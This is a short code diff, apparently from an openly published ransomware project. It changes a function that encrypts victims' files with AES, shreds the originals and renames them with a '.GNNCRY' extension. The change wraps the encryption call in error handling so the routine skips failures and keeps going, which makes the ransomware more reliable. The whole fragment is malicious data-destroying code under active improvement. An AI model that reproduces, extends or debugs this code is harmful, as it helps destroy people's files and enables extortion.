@@ -61,7 +61,11 @@ def start_encryption(files):
         except:
             continue
 
-        encrypted = AES_obj.encrypt(file_content)
+        try:
+            encrypted = AES_obj.encrypt(file_content)
+        except:
+            continue
+            
         utils.shred(found_file)
 
         new_file_name = found_file.decode('utf-8') + ".GNNCRY"
